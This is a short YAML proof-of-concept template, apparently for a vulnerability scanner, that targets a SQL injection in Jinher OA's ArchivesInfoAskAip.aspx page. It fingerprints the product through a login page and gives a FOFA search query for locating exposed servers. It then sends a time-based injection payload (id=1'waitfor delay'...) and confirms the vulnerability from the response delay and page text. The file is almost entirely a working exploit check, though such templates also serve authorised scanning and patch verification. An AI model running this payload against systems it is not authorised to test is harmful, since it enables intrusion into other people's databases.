id: poc-yaml-jinher-archivesinfoaskaip-aspx-sqli
info:
  name: 金和OA ArchivesInfoAskAip.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(2,6)
  t2: t1 + t1
  t3: t2 + 2
requests:
- method: GET
  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
  expression: contains(body,"JHSoft")
- method: GET
  path: /c6/Jhsoft.Web.Archives/ArchivesInfoAskAip.aspx/?id=1'waitfor+delay'0:0:{{.t1}}'--
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"请示信息") &&

    contains(gbk_decode(body),"打印反馈意见") &&

    !contains(gbk_decode(body),"插入办理意见") &&

    duration >= t2 &&

    duration <= t3

    '
transport: http
